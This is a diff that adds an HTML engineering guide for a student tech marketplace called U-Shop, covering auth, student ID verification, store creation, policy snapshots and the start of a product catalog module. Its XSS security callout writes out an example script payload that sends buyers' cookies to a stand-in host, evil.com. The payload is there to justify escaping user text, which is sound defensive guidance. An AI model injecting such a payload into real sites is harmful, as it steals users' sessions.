+  <span class="kw">const</span> <span class="var">expectedPrefix</span> = `student-ids/${<span class="var">userId</span>}/`
+  <span class="kw">if</span> (!<span class="var">idImagePath.startsWith</span>(<span class="var">expectedPrefix</span>))
+    <span class="kw">throw new</span> <span class="fn">ForbiddenError</span>(<span class="str">'Invalid file path'</span>)
+
+  <span class="kw">await</span> <span class="var">prisma.user.update</span>({
+    <span class="var">where</span>: { <span class="var">id</span>: <span class="var">userId</span> },
+    <span class="var">data</span>: { <span class="var">verificationStatus</span>: <span class="str">'PENDING'</span>, <span class="var">studentIdImagePath</span>: <span class="var">idImagePath</span> }
+  })
+  <span class="cm">// Queue a notification to the admin review queue</span>
+  <span class="kw">await</span> <span class="var">notificationQueue.add</span>(<span class="str">'admin-review-needed'</span>, { <span class="var">userId</span>, <span class="var">type</span>: <span class="str">'student-id'</span> })
+}</code></pre>
+
+  <!-- PILLAR 2 -->
+  <div class="pillar" id="m1-perf"><span class="pillar-badge pb-perf">Pillar 2</span><h2>Performance & Optimization</h2></div>
+  <p>Auth is in the hot path of every page load. Performance failures here manifest as frustrating full-page loading spinners.</p>
+
+  <ul class="ul">
+    <li><strong>Session reads are edge-fast.</strong> The Supabase <code>@supabase/ssr</code> library reads the session from a cookie — this is a synchronous memory read in Next.js middleware. No network round-trip to Supabase occurs on every request. The middleware only makes a network call when the access token has expired and needs to be refreshed from the refresh token.</li>
+    <li><strong>Cache the DB user lookup in Redis.</strong> The Express <code>authenticate</code> middleware calls <code>prisma.user.findUnique({ supabaseId })</code> on every authenticated request. This query hits the database every time. Cache the result in Redis with key <code>user:supa:{supabaseId}</code> and TTL of 5 minutes. Invalidate the cache key whenever the user's role or verification status changes.</li>
+    <li><strong>The <code>/auth/me</code> endpoint uses Next.js fetch caching.</strong> Dashboard layouts call <code>/api/v1/auth/me</code> to get the user's full profile. Tag this fetch with <code>next: { tags: ['user-me'] }</code>. Call <code>revalidateTag('user-me')</code> after any user update. This prevents redundant profile fetches across RSC re-renders on the same request.</li>
+    <li><strong>Image compression before upload.</strong> Use the browser's <code>canvas</code> API to compress student ID photos to JPEG at 85% quality, max 1200px wide, before uploading. This reduces upload time from ~8s on 3G to ~1.5s without visibly degrading legibility for admin reviewers.</li>
+  </ul>
+
+  <!-- PILLAR 3 -->
+  <div class="pillar" id="m1-sec"><span class="pillar-badge pb-sec">Pillar 3</span><h2>Security & Error Handling</h2></div>
+
+  <div class="callout callout-red">
+    <strong>Auth Rate Limiting — Critical</strong>
+    <p>Apply <strong>10 requests per IP per minute</strong> on all <code>/auth/*</code> routes. This prevents brute-force password attacks and credential stuffing. Use Upstash Redis sliding window. Separate limits: <strong>3 failed login attempts per IP per 15 minutes</strong> trigger a temporary lockout and an email alert to the account owner. Implement this as a BullMQ delayed job, not a simple setTimeout — server restarts must not reset the lockout timer.</p>
+  </div>
+
+  <ul class="ul">
+    <li><strong>Email enumeration prevention.</strong> On "Forgot Password", always return <code>200 OK</code> with the message "If an account exists, you'll receive an email." Never return <code>404 Not Found</code> for non-existent emails — this lets attackers enumerate your user list.</li>
+    <li><strong>Student ID path validation.</strong> When Express receives a <code>studentIdImagePath</code>, validate that it starts with <code>student-ids/{userId}/</code> — the authenticated user's own prefix. A malicious user could submit a path like <code>student-ids/admin123/id.webp</code> to overwrite another user's verification document.</li>
+    <li><strong>Role escalation prevention.</strong> The <code>/auth/sync</code> endpoint ignores any <code>role</code> value in the request body — the role is only set from <code>supabaseUser.user_metadata</code> which is controlled server-side. A user cannot POST <code>{ "role": "ADMIN" }</code> to elevate themselves.</li>
+    <li><strong>ADMIN role is never self-assigned.</strong> Admin users are created directly in the database by a privileged migration script. The application code has no code path that sets <code>role = 'ADMIN'</code> based on user input. Any attempt is silently ignored by the Zod schema validation layer.</li>
+    <li><strong>Graceful degradation.</strong> If Supabase Auth is down during the Express <code>authenticate</code> middleware call, catch the network error and return <code>503 Service Unavailable</code> with <code>Retry-After: 30</code>. Never return <code>401 Unauthorized</code> — that implies the token is invalid, not that the verification service is down. These are semantically different from the client's perspective.</li>
+  </ul>
+
+  <!-- PILLAR 4 -->
+  <div class="pillar" id="m1-log"><span class="pillar-badge pb-log">Pillar 4</span><h2>Logging & Observability</h2></div>
+  <p>Use <strong>structured JSON logging</strong> (via <code>pino</code>) so logs can be queried in Sentry/Datadog/Logtail. Never log raw JWT tokens, passwords, or PII like full email addresses. Log the first 4 chars of an email followed by <code>***</code> for identification without exposure.</p>
+
+  <div class="log-grid">
+    <div class="log-card log-info">
+      <h4>INFO</h4>
+      <ul>
+        <li>User registered (userId, role, verificationStatus)</li>
+        <li>Student auto-verified via email domain (userId, domain)</li>
+        <li>Student ID submitted for review (userId)</li>
+        <li>Admin approved/rejected student ID (userId, adminId, decision)</li>
+        <li>User role updated (userId, oldRole, newRole)</li>
+      </ul>
+    </div>
+    <div class="log-card log-warn">
+      <h4>WARN</h4>
+      <ul>
+        <li>Login rate limit hit (IP, attemptCount, windowMs)</li>
+        <li>JWT verification failed (reason: expired | invalid | malformed)</li>
+        <li>Student ID path validation failed — possible path injection (userId, submittedPath)</li>
+        <li>Role escalation attempt blocked (userId, attemptedRole)</li>
+        <li>Supabase auth.getUser() slow response > 2000ms (duration)</li>
+      </ul>
+    </div>
+    <div class="log-card log-fatal">
+      <h4>FATAL</h4>
+      <ul>
+        <li>Supabase Auth service unreachable after 3 retries (error, endpoint)</li>
+        <li>Prisma user upsert failed — DB constraint violation (supabaseId, error)</li>
+        <li>Redis cache write failed — falling back to DB-only mode (error)</li>
+        <li>Student ID deletion job failed — GDPR compliance at risk (userId, imagePath, error)</li>
+      </ul>
+    </div>
+  </div>
+
+  <pre><code><span class="cm">// Structured log format — never log PII in plain text</span>
+<span class="var">logger.info</span>({
+  <span class="var">event</span>:     <span class="str">'student_id_submitted'</span>,
+  <span class="var">userId</span>:    <span class="var">user.id</span>,          <span class="cm">// Internal cuid — safe to log</span>
+  <span class="var">email</span>:     <span class="fn">maskEmail</span>(<span class="var">user.email</span>),  <span class="cm">// "kwam***@ug.edu.gh"</span>
+  <span class="var">timestamp</span>: <span class="kw">new</span> <span class="fn">Date</span>().<span class="fn">toISOString</span>(),
+  <span class="cm">// NO: user.studentIdImagePath — contains a real file path with userId embedded</span>
+  <span class="cm">// NO: rawJwt, password, full email address</span>
+}, <span class="str">'Student ID submitted for admin review'</span>)</code></pre>
+
+  <!-- PILLAR 5 -->
+  <div class="pillar" id="m1-edge"><span class="pillar-badge pb-edge">Pillar 5</span><h2>Edge Cases & Missed Scenarios</h2></div>
+
+  <div class="edge-grid">
+    <div class="edge-card">
+      <h4>Duplicate signup via OAuth + email</h4>
+      <div class="edge-problem">A user signs up with their Google account (which is their .edu.gh email), then later tries to sign up with email/password using the same address. Supabase handles this by linking accounts, but your <code>syncUser</code> upsert must be idempotent and not create duplicate rows.</div>
+      <div class="edge-fix">The <code>upsert</code> on <code>supabaseId</code> handles this at the DB level. But also: Supabase itself will prevent duplicate signups for the same email address and return an error that you must surface gracefully: "An account with this email already exists. Try signing in instead."</div>
+    </div>
+    <div class="edge-card">
+      <h4>Student graduates — verification expires</h4>
+      <div class="edge-problem">A student verified via email domain graduates. Their .edu.gh email still works (universities rarely revoke alumni email access), so they continue to get the 5% student fee rate indefinitely.</div>
+      <div class="edge-fix">Add a <code>verifiedAt</code> + 12-month annual re-verification check. A BullMQ cron runs monthly and identifies users whose <code>verifiedAt</code> is 11 months ago. Send a re-verification nudge email. At 12 months: downgrade to UNVERIFIED + send email. Include an Alumni Seller path (6% rate) as a graceful transition documented in your ToS.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Admin review race condition</h4>
+      <div class="edge-problem">Two admin users open the same pending ID review in the admin panel simultaneously. Both approve it. The second approval is a no-op but could trigger duplicate notifications to the user.</div>
+      <div class="edge-fix">The admin approval mutation uses an atomic Prisma update with a <code>where: { id, verificationStatus: 'PENDING' }</code> guard. The second admin's update matches 0 rows and returns a 404 response. The notification job checks the current status before sending — only sends if <code>verificationStatus</code> just changed to <code>VERIFIED</code> (compare before/after in the update result).</div>
+    </div>
+    <div class="edge-card">
+      <h4>Webhook triggers syncUser before OAuth callback completes</h4>
+      <div class="edge-problem">Supabase can fire auth state events before the OAuth redirect callback handler completes. In a race condition, <code>syncUser</code> could be called before the user's metadata (name, role) is fully populated.</div>
+      <div class="edge-fix">Make <code>syncUser</code> purely additive on the first call: only set <code>name</code> and <code>role</code> if they aren't already set. The <code>update</code> branch of the upsert only refreshes the email. A separate <code>PATCH /api/v1/users/me</code> endpoint allows users to complete their profile in the onboarding flow after the callback.</div>
+    </div>
+  </div>
+
+  <!-- PILLAR 6 -->
+  <div class="pillar" id="m1-test"><span class="pillar-badge pb-test">Pillar 6</span><h2>Testing & Deployment Readiness</h2></div>
+  <div class="test-grid">
+    <div class="test-card">
+      <h4>Unit Tests (Vitest)</h4>
+      <ul>
+        <li><code>isUniversityEmail()</code> returns true for all 10 known domains</li>
+        <li><code>isUniversityEmail()</code> returns false for gmail.com, yahoo.com, fake-ug.edu.gh</li>
+        <li><code>syncUser()</code> creates wallet on first call; does NOT create duplicate wallet on second call</li>
+        <li><code>autoVerifyStudentEmail()</code> only runs if <code>verificationStatus === 'UNVERIFIED'</code></li>
+        <li>Student ID path validation rejects paths not starting with <code>student-ids/{userId}/</code></li>
+        <li><code>maskEmail()</code> correctly redacts all email formats without breaking</li>
+        <li>Role escalation: any <code>role = 'ADMIN'</code> in request body is silently stripped by Zod schema</li>
+      </ul>
+    </div>
+    <div class="test-card">
+      <h4>E2E Tests (Playwright)</h4>
+      <ul>
+        <li>Full email/password signup → email confirmation → dashboard redirect</li>
+        <li>Google OAuth flow → <code>syncUser</code> called → user appears in DB</li>
+        <li>Login with .edu.gh email → student badge visible in dashboard within 3s</li>
+        <li>Admin rejects student ID → user receives email → status = REJECTED in UI</li>
+        <li>Admin approves student ID → commission rate drops to 5% on next listing creation</li>
+        <li>Rate limit test: 11 login attempts in 60s → 429 response → lockout email sent</li>
+        <li>Unauthenticated access to <code>/dashboard</code> → redirect to <code>/auth/login?redirectTo=/dashboard</code></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════
+     MODULE 02 — STORE & POLICY
+════════════════════════════════════════ -->
+<div class="section" id="m2">
+  <div class="sec-label">Module 02</div>
+  <div class="module-header">
+    <div class="mh-num">02</div>
+    <div class="mh-content">
+      <div class="mh-label">Feature Module</div>
+      <div class="mh-title">Store Creation & Policy Generation</div>
+      <div class="mh-sub">Custom store URLs, handle uniqueness, OG image generation, structured policy builder, policy snapshotting, and public store pages.</div>
+      <div class="mh-tags">
+        <span class="mh-tag" style="color:var(--purple);border-color:rgba(107,31,168,0.35)">Custom URLs</span>
+        <span class="mh-tag" style="color:var(--next);border-color:rgba(0,112,243,0.25)">SSR + ISR</span>
+        <span class="mh-tag" style="color:var(--amber);border-color:rgba(245,158,11,0.25)">Policy Snapshots</span>
+        <span class="mh-tag" style="color:var(--supa);border-color:rgba(62,207,142,0.25)">OG Images</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- PILLAR 1 -->
+  <div class="pillar" id="m2-impl"><span class="pillar-badge pb-impl">Pillar 1</span><h2>Core Implementation Logic</h2></div>
+
+  <h3>Step 1 — Handle Validation & Availability Check</h3>
+  <p>The store handle is the most user-facing piece of infrastructure you'll build. It must be validated at multiple layers: client-side regex check (instant feedback), server-side availability check via debounced API call (300ms), and database-level unique constraint (final safety net). Never rely on only one layer.</p>
+
+  <pre><code><span class="cm">// apps/api/src/services/store.service.ts</span>
+
+<span class="cm">// Blocklist of reserved handles. Expand this carefully — every reserved word</span>
+<span class="cm">// is a handle that can never be claimed, even if you want to sell it later.</span>
+<span class="kw">const</span> <span class="var">RESERVED_HANDLES</span> = <span class="kw">new</span> <span class="fn">Set</span>([
+  <span class="str">'admin'</span>, <span class="str">'api'</span>, <span class="str">'auth'</span>, <span class="str">'checkout'</span>, <span class="str">'dashboard'</span>, <span class="str">'help'</span>,
+  <span class="str">'login'</span>, <span class="str">'logout'</span>, <span class="str">'search'</span>, <span class="str">'settings'</span>, <span class="str">'store'</span>, <span class="str">'stores'</span>,
+  <span class="str">'support'</span>, <span class="str">'terms'</span>, <span class="str">'privacy'</span>, <span class="str">'about'</span>, <span class="str">'pricing'</span>,
+  <span class="str">'ushop'</span>, <span class="str">'u-shop'</span>, <span class="str">'uShop'</span>, <span class="str">'www'</span>, <span class="str">'mail'</span>, <span class="str">'blog'</span>,
+])
+
+<span class="kw">export const</span> <span class="var">HANDLE_REGEX</span> = <span class="var">/^[a-z0-9][a-z0-9-]{1,30}[a-z0-9]$/</span>
+
+<span class="kw">export async function</span> <span class="fn">checkHandleAvailability</span>(<span class="var">handle: string</span>) {
+  <span class="cm">// Layer 1: Format check</span>
+  <span class="kw">if</span> (!<span class="var">HANDLE_REGEX.test</span>(<span class="var">handle</span>))
+    <span class="kw">return</span> { <span class="var">available</span>: <span class="kw">false</span>, <span class="var">reason</span>: <span class="str">'Invalid format'</span> }
+
+  <span class="cm">// Layer 2: Blocklist check</span>
+  <span class="kw">if</span> (<span class="var">RESERVED_HANDLES.has</span>(<span class="var">handle.toLowerCase</span>()))
+    <span class="kw">return</span> { <span class="var">available</span>: <span class="kw">false</span>, <span class="var">reason</span>: <span class="str">'Reserved'</span> }
+
+  <span class="cm">// Layer 3: Database uniqueness check</span>
+  <span class="cm">// Also check previousHandle — a seller who changed their handle from "kwame-tech"</span>
+  <span class="cm">// to "kwame-electronics" has freed up "kwame-tech" for others (after 90 days).</span>
+  <span class="kw">const</span> <span class="var">existing</span> = <span class="kw">await</span> <span class="var">prisma.store.findFirst</span>({
+    <span class="var">where</span>: { <span class="var">OR</span>: [{ <span class="var">handle</span> }, { <span class="var">previousHandle</span>: <span class="var">handle</span> }] },
+    <span class="var">select</span>: { <span class="var">id</span>: <span class="kw">true</span> }
+  })
+  <span class="kw">return</span> { <span class="var">available</span>: !<span class="var">existing</span> }
+}</code></pre>
+
+  <h3>Step 2 — Store Creation with Atomic Policy Init</h3>
+
+  <pre><code><span class="cm">// apps/api/src/services/store.service.ts</span>
+<span class="kw">export async function</span> <span class="fn">createStore</span>(<span class="var">ownerId: string</span>, <span class="var">dto: CreateStoreDto</span>) {
+  <span class="cm">// Idempotency: a user can only have one store</span>
+  <span class="kw">const</span> <span class="var">existing</span> = <span class="kw">await</span> <span class="var">prisma.store.findUnique</span>({ <span class="var">where</span>: { <span class="var">ownerId</span> } })
+  <span class="kw">if</span> (<span class="var">existing</span>) <span class="kw">throw new</span> <span class="fn">ConflictError</span>(<span class="str">'You already have a store'</span>)
+
+  <span class="cm">// Re-validate handle inside the service — controller already validated,</span>
+  <span class="cm">// but services should never trust their callers blindly</span>
+  <span class="kw">const</span> { <span class="var">available</span> } = <span class="kw">await</span> <span class="fn">checkHandleAvailability</span>(<span class="var">dto.handle</span>)
+  <span class="kw">if</span> (!<span class="var">available</span>) <span class="kw">throw new</span> <span class="fn">ConflictError</span>(<span class="str">'This store URL is taken'</span>)
+
+  <span class="cm">// Default return policy — every store starts with the platform minimum.</span>
+  <span class="cm">// Sellers can customize this, but this is always the starting point.</span>
+  <span class="kw">const</span> <span class="var">defaultPolicy</span> = {
+    <span class="var">returnWindow</span>:       <span class="str">'NO_RETURNS'</span>,
+    <span class="var">returnCondition</span>:    <span class="str">'SAME_CONDITION'</span>,
+    <span class="var">returnShipping</span>:     <span class="str">'BUYER_PAYS'</span>,
+    <span class="var">warrantyPeriod</span>:     <span class="str">'NONE'</span>,
+    <span class="var">warrantyCoverage</span>:   <span class="str">'DOA_ONLY'</span>,
+    <span class="var">refundMethod</span>:       <span class="str">'PLATFORM_WALLET'</span>,
+    <span class="var">policyNotes</span>:        <span class="str">''</span>,
+    <span class="var">policyVersion</span>:      <span class="num">1</span>,    <span class="cm">// Increment on every update for audit trail</span>
+    <span class="var">lastUpdated</span>:        <span class="kw">new</span> <span class="fn">Date</span>().<span class="fn">toISOString</span>(),
+  }
+
+  <span class="kw">const</span> <span class="var">store</span> = <span class="kw">await</span> <span class="var">prisma.store.create</span>({
+    <span class="var">data</span>: {
+      <span class="var">handle</span>:       <span class="var">dto.handle</span>,
+      <span class="var">name</span>:         <span class="var">dto.name</span>,
+      <span class="var">bio</span>:          <span class="var">dto.bio?.slice</span>(<span class="num">0</span>, <span class="num">280</span>),  <span class="cm">// Enforce DB-level char limit in app layer too</span>
+      <span class="var">returnPolicy</span>: <span class="var">defaultPolicy</span>,
+      <span class="var">ownerId</span>,
+    }
+  })
+
+  <span class="cm">// Update the owner's role to include SELLER if they were BUYER-only</span>
+  <span class="kw">await</span> <span class="var">prisma.user.update</span>({
+    <span class="var">where</span>: { <span class="var">id</span>: <span class="var">ownerId</span> },
+    <span class="var">data</span>:  { <span class="var">role</span>: <span class="str">'BOTH'</span> }   <span class="cm">// Now they are both a buyer and a seller</span>
+  })
+
+  <span class="cm">// Trigger OG image generation job (async — doesn't block response)</span>
+  <span class="kw">await</span> <span class="var">ogImageQueue.add</span>(<span class="str">'generate'</span>, { <span class="var">storeId</span>: <span class="var">store.id</span>, <span class="var">handle</span>: <span class="var">store.handle</span> })
+
+  <span class="kw">return</span> <span class="var">store</span>
+}</code></pre>
+
+  <h3>Step 3 — Public Store Page (Next.js Rendering)</h3>
+
+  <pre><code><span class="cm">// apps/web/app/store/[handle]/page.tsx — Server Component</span>
+<span class="kw">import</span> { <span class="var">notFound</span>, <span class="var">redirect</span> } <span class="kw">from</span> <span class="str">'next/navigation'</span>
+
+<span class="cm">// generateMetadata runs server-side for SEO. Vercel will render this as HTML.</span>
+<span class="kw">export async function</span> <span class="fn">generateMetadata</span>({ <span class="var">params</span> }: { <span class="var">params</span>: { <span class="var">handle</span>: <span class="type">string</span> } }) {
+  <span class="kw">const</span> <span class="var">store</span> = <span class="kw">await</span> <span class="fn">fetchStore</span>(<span class="var">params.handle</span>)
+  <span class="kw">if</span> (!<span class="var">store</span>) <span class="kw">return</span> {}
+  <span class="kw">return</span> {
+    <span class="var">title</span>:       `${<span class="var">store.name</span>} — U-Shop`,
+    <span class="var">description</span>: <span class="var">store.bio</span> ?? `Browse tech gear from ${<span class="var">store.name</span>} on U-Shop`,
+    <span class="var">openGraph</span>: {
+      <span class="var">images</span>: [{ <span class="var">url</span>: `https://ushop.com/api/og/store/${<span class="var">params.handle</span>}` }]
+    }  <span class="cm">// OG image is a Next.js route handler that generates the preview image dynamically</span>
+  }
+}
+
+<span class="kw">export default async function</span> <span class="fn">StorePage</span>({ <span class="var">params</span> }: { <span class="var">params</span>: { <span class="var">handle</span>: <span class="type">string</span> } }) {
+  <span class="kw">const</span> <span class="var">store</span> = <span class="kw">await</span> <span class="fn">fetchStore</span>(<span class="var">params.handle</span>)  <span class="cm">// Cached fetch — see Performance below</span>
+
+  <span class="cm">// Handle changed: old URL → redirect to new URL with 301</span>
+  <span class="kw">if</span> (<span class="var">store</span>?.<span class="var">previousHandle</span> === <span class="var">params.handle</span>) {
+    <span class="fn">redirect</span>(`/store/${<span class="var">store.handle</span>}`, <span class="var">RedirectType.permanent</span>)
+  }
+
+  <span class="kw">if</span> (!<span class="var">store</span> || !<span class="var">store.isActive</span>) <span class="fn">notFound</span>()
+
+  <span class="cm">// This is a Server Component — fetches data, renders HTML, no JS sent for layout</span>
+  <span class="cm">// Only interactive leaf components (AddToCart button, MessageSeller) are Client Components</span>
+  <span class="kw">return</span> (
+    &lt;<span class="var">StoreLayout</span> <span class="var">store</span>={<span class="var">store</span>}&gt;
+      &lt;<span class="var">ListingsGrid</span> <span class="var">storeId</span>={<span class="var">store.id</span>} /&gt;  {<span class="cm">/* Another Server Component — fetches listings */</span>}
+    &lt;/<span class="var">StoreLayout</span>&gt;
+  )
+}</code></pre>
+
+  <!-- PILLAR 2 -->
+  <div class="pillar" id="m2-perf"><span class="pillar-badge pb-perf">Pillar 2</span><h2>Performance & Optimization</h2></div>
+
+  <ul class="ul">
+    <li><strong>ISR (Incremental Static Regeneration) for store pages.</strong> Use <code>revalidate: 60</code> on the <code>fetchStore</code> call. Vercel will statically render and cache the page for 60 seconds. After 60 seconds, the first request triggers background re-generation while still serving the stale page. This gives static-page performance with near-real-time freshness.</li>
+    <li><strong>On-demand revalidation on store update.</strong> When a seller updates their store name, bio, or policy, call <code>revalidatePath('/store/janes-tech')</code> from a Server Action. This immediately invalidates the ISR cache. The next visitor gets the fresh version, not the 60-second stale version.</li>
+    <li><strong>Handle availability check is debounced + Redis-cached.</strong> The frontend debounces the API call to 300ms on input. The Express handler checks a Redis cache first (<code>handle:available:{slug}</code>, TTL: 30 seconds) before hitting the database. This prevents a database query on every keystroke even if the debounce fails.</li>
+    <li><strong>OG image generation is lazy and cached.</strong> The OG image route handler (<code>/api/og/store/[handle]</code>) generates the preview image using <code>@vercel/og</code> with the Edge Runtime on first hit, then Vercel caches it at the CDN layer for 24 hours. The seller's logo and name are embedded in the image at generation time. Cache-Control: <code>s-maxage=86400, stale-while-revalidate=3600</code>.</li>
+  </ul>
+
+  <!-- PILLAR 3 -->
+  <div class="pillar" id="m2-sec"><span class="pillar-badge pb-sec">Pillar 3</span><h2>Security & Error Handling</h2></div>
+
+  <div class="callout callout-red">
+    <strong>XSS Prevention in Custom Store Policies</strong>
+    <p>The policy <code>policyNotes</code> field is free text (max 500 chars) that gets displayed on every listing and at checkout. If rendered as raw HTML, a seller could inject <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code> and steal every buyer's session token who views their listings. <strong>Mitigation: always render <code>policyNotes</code> with React's default text rendering</strong> (via <code>{policy.policyNotes}</code> not <code>dangerouslySetInnerHTML</code>). React escapes HTML entities by default. Additionally, sanitize the input on the backend with <code>DOMPurify</code> (server-side via <code>isomorphic-dompurify</code>) before persisting, stripping all HTML tags to plain text. Never display rich HTML from user-supplied store policy text.</p>
+  </div>
+
+  <ul class="ul">
+    <li><strong>Policy field enumeration — never accept free-text for structured fields.</strong> The <code>returnWindow</code>, <code>warrantyPeriod</code>, and other policy enum fields are validated against a Zod enum schema on the backend. A Zod <code>z.enum(['NO_RETURNS', '24H', '3D', '7D', '14D', '30D'])</code> will throw a 400 error for any value not in the list, preventing injection via these fields.</li>
+    <li><strong>Policy snapshot immutability.</strong> At order creation, the store's <code>returnPolicy</code> JSON is deep-copied and stored on the <code>Order.policySnapshot</code> field. This happens inside the Prisma transaction. Even if the seller updates their policy 5 minutes later, the order record already has the immutable version the buyer agreed to. The dispute system always reads <code>order.policySnapshot</code>, never <code>store.returnPolicy</code>.</li>
+    <li><strong>Store deactivation (soft delete).</strong> Never hard-delete a store. Set <code>store.isActive = false</code>. All historical orders still reference the store, and buyers need to see seller information for past transactions. The public store page returns a 404 for inactive stores, but admin can still access them. Hard deleting would break relational integrity of the <code>orders</code> table.</li>
+  </ul>
+
+  <!-- PILLAR 4 -->
+  <div class="pillar" id="m2-log"><span class="pillar-badge pb-log">Pillar 4</span><h2>Logging & Observability</h2></div>
+
+  <div class="log-grid">
+    <div class="log-card log-info">
+      <h4>INFO</h4>
+      <ul>
+        <li>Store created (storeId, handle, ownerId, isStudentSeller)</li>
+        <li>Store policy updated (storeId, policyVersion, changedFields)</li>
+        <li>Store handle changed (storeId, oldHandle, newHandle)</li>
+        <li>OG image generated (handle, durationMs)</li>
+      </ul>
+    </div>
+    <div class="log-card log-warn">
+      <h4>WARN</h4>
+      <ul>
+        <li>Handle availability check race — took DB lock (handle, durationMs)</li>
+        <li>policyNotes XSS attempt blocked (userId, strippedContent)</li>
+        <li>Store update attempted while orders in transit (storeId, activeOrderCount)</li>
+        <li>Handle uniqueness conflict at DB level — app-layer check missed (handle)</li>
+      </ul>
+    </div>
+    <div class="log-card log-fatal">
+      <h4>FATAL</h4>
+      <ul>
+        <li>Policy snapshot failed at order creation (orderId, storeId, error)</li>
+        <li>OG image generation job failed 3 times (handle, error)</li>
+        <li>Store creation DB unique constraint violated — handle race condition (handle)</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- PILLAR 5 -->
+  <div class="pillar" id="m2-edge"><span class="pillar-badge pb-edge">Pillar 5</span><h2>Edge Cases & Missed Scenarios</h2></div>
+
+  <div class="edge-grid">
+    <div class="edge-card">
+      <h4>Two sellers claim the same handle simultaneously</h4>
+      <div class="edge-problem">Seller A and Seller B both check handle "kwame-tech" at the same time. Both get "available". Both submit the create form. Who wins?</div>
+      <div class="edge-fix">The database unique constraint on <code>stores.handle</code> is the final arbiter. The second insert throws a Prisma P2002 unique constraint violation. Catch this specific error code in the controller and return <code>409 Conflict</code> with the message "This URL was just taken. Please choose another." Do NOT rely on the application-layer availability check alone.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Policy change with orders in transit</h4>
+      <div class="edge-problem">A seller updates their return policy from "7 Days" to "No Returns" while three orders are in transit. Buyers of those orders were shown the 7-day policy at checkout.</div>
+      <div class="edge-fix">Policy changes are always forward-only. The <code>order.policySnapshot</code> field contains the immutable policy snapshot for each existing order. In-transit order buyers always get their checkout-time policy. The updated policy only applies to new orders created after the policy change. No action needed beyond the snapshot mechanism.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Seller with active orders tries to delete store</h4>
+      <div class="edge-problem">A seller wants to close their store, but they have 3 orders in PAYMENT_RECEIVED or PROCESSING status. Hard-deleting the store would cascade-delete listings and break order history.</div>
+      <div class="edge-fix">Block store deactivation if <code>orders.count({ storeId, status: { in: ['PAYMENT_RECEIVED', 'PROCESSING', 'IN_TRANSIT', 'DISPUTED'] } }) > 0</code>. Return a 409 with a clear message listing the active order count. Once all orders reach a terminal state (COMPLETED, REFUNDED, CANCELLED), allow deactivation. Set <code>isActive = false</code> — never <code>DELETE</code>.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Handle SEO continuity after change</h4>
+      <div class="edge-problem">A seller changes their handle from "kwame-tech" to "kwame-electronics". Google has indexed hundreds of pages at the old URL. Without a redirect, all that SEO value evaporates and existing social media links break.</div>
+      <div class="edge-fix">Store the old handle in <code>previousHandle</code> on the Store record. The store page Server Component checks if <code>params.handle === store.previousHandle</code> and calls Next.js <code>redirect()</code> with <code>RedirectType.permanent</code> (HTTP 301). Vercel caches this 301 at the edge. Handle changes are limited to once — prevent perpetual redirect chains.</div>
+    </div>
+  </div>
+
+  <!-- PILLAR 6 -->
+  <div class="pillar" id="m2-test"><span class="pillar-badge pb-test">Pillar 6</span><h2>Testing & Deployment Readiness</h2></div>
+  <div class="test-grid">
+    <div class="test-card">
+      <h4>Unit Tests (Vitest)</h4>
+      <ul>
+        <li><code>checkHandleAvailability()</code> rejects 'admin', 'api', 'store', 'search'</li>
+        <li><code>checkHandleAvailability()</code> rejects handles with trailing hyphens</li>
+        <li>Policy sanitizer strips <code>&lt;script&gt;</code> tags from policyNotes</li>
+        <li><code>createStore()</code> throws ConflictError if user already has a store</li>
+        <li>Policy version increments on every <code>updatePolicy()</code> call</li>
+        <li>Snapshot deep-copy doesn't retain references to original store.returnPolicy object</li>
+      </ul>
+    </div>
+    <div class="test-card">
+      <h4>E2E Tests (Playwright)</h4>
+      <ul>
+        <li>Handle availability check shows ✓ for free handles within 400ms</li>
+        <li>Simultaneous handle claim — second user gets 409 error message</li>
+        <li>Store page is server-rendered (check for content in curl/wget without JS)</li>
+        <li>Store policy update → new order has new policy snapshot; old order unchanged</li>
+        <li>Old handle URL → 301 redirect to new handle URL</li>
+        <li>WhatsApp link preview contains store name and logo (OG image renders)</li>
+        <li>Deactivated store returns 404 public page but admin can view it</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════
+     MODULE 03 — PRODUCT CATALOG & SEARCH
+════════════════════════════════════════ -->
+<div class="section" id="m3">
+  <div class="sec-label">Module 03</div>
+  <div class="module-header">
+    <div class="mh-num">03</div>
+    <div class="mh-content">
+      <div class="mh-label">Feature Module</div>
+      <div class="mh-title">Product Catalog & Search</div>
+      <div class="mh-sub">Listing CRUD, full-text search via PostgreSQL tsvector, cursor-based pagination, category filtering, condition grading enforcement, and Redis-cached results.</div>
+      <div class="mh-tags">
+        <span class="mh-tag" style="color:var(--cyan);border-color:rgba(6,182,212,0.25)">tsvector Search</span>
+        <span class="mh-tag" style="color:var(--rose);border-color:rgba(244,63,94,0.25)">Cursor Pagination</span>
+        <span class="mh-tag" style="color:#dc382d;border-color:rgba(220,56,45,0.3)">Redis Cache</span>
+        <span class="mh-tag" style="color:var(--green);border-color:rgba(34,197,94,0.25)">RSC + Streaming</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- PILLAR 1 -->
+  <div class="pillar" id="m3-impl"><span class="pillar-badge pb-impl">Pillar 1</span><h2>Core Implementation Logic</h2></div>
+
+  <h3>Step 1 — Listing Creation with Condition Enforcement</h3>
+
+  <pre><code><span class="cm">// apps/api/src/services/listing.service.ts</span>
+
+<span class="cm">// Condition requirements — each grade has minimum photo requirements.</span>
+<span class="cm">// This enforces the PRD requirement that reduces the "condition grade war."</span>
+<span class="kw">const</span> <span class="var">CONDITION_REQUIREMENTS</span>: <span class="type">Record</span>&lt;<span class="type">string</span>, { <span class="var">minPhotos</span>: <span class="type">number</span>; <span class="var">requiresBatteryShot</span>: <span class="type">boolean</span> }&gt; = {
+  <span class="var">NEW</span>:           { <span class="var">minPhotos</span>: <span class="num">2</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">false</span> },
+  <span class="var">LIKE_NEW</span>:      { <span class="var">minPhotos</span>: <span class="num">3</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">false</span> },
